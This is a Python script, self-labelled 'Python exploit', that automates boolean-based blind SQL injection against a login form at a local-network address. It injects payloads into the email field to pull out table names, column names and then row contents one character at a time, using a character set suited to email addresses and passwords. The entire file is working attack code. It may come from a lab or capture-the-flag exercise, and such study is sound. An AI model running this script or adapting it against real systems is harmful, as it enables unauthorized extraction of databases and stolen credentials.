from cmath import inf
from email import header
from operator import contains
from tabnanny import check
import requests
import html
import argparse
import os
import re

def gettable():
    url = "http://192.168.11.128/login.php"
    table=''
    for i in range(1,15):
        index = i
        for j in range(43,123):
            ascii = j
            data = {"email":"test' or {}=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))-- ".format(ascii,index),"password":"","submit":""}
            res= requests.post(url,data=data)
            if(res.text.find('Wrong password')!=-1):
                table+=chr(ascii)
    print(table)
def table(table):
    url = "http://192.168.11.128/login.php"
    headers = headers={'Connection': 'close'}
    list=''
    for i in range(1,40):
        index = i
        for j in range(43,123):
            ascii = j
            data = {"email":"test' or {}=ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{}'),{},1))-- ".format(ascii,table,index),"password":"","submit":""}
            res= requests.post(url,data=data)
            if(res.text.find('Wrong password')!=-1):
                list+=chr(ascii)
    list = list.split(",")
    listascii=[]
    listascii.append(44)
    listascii.append(46)
    for i in range(48,58):
        listascii.append(i)
    listascii.append(64)
    for i in range(97,123):
        listascii.append(i)
    
    for i in range(8):
        inf=''
        stt = i
        check=1
        for j in range(len(list)):
            column = list[j]
            inf+='     '
            for k in range(1,20):
                index = k
                for m in range(len(listascii)):
                    ascii = listascii[m]
                    data = {"email":"test' or {}=ascii(substr((select {} from {} limit {},1),{},1))-- ".format(ascii,column,table,stt,index),"password":"","submit":""}
                    res= requests.post(url,data=data,headers=headers)
                    if(res.text.find('Wrong password')!=-1):
                        inf+=chr(ascii)
                        check=0

        if(check==0):print(inf)

if __name__ == '__main__':
    parser=argparse.ArgumentParser(description='Python exploit')
    parser.add_argument('-g',"--gettable",default=None)
    parser.add_argument('-t',"--table",default=None)
    args=parser.parse_args()
    args = parser.parse_args()
    if args.gettable  != None:
        gettable()
    elif args.table !=None:
        table(args.table)


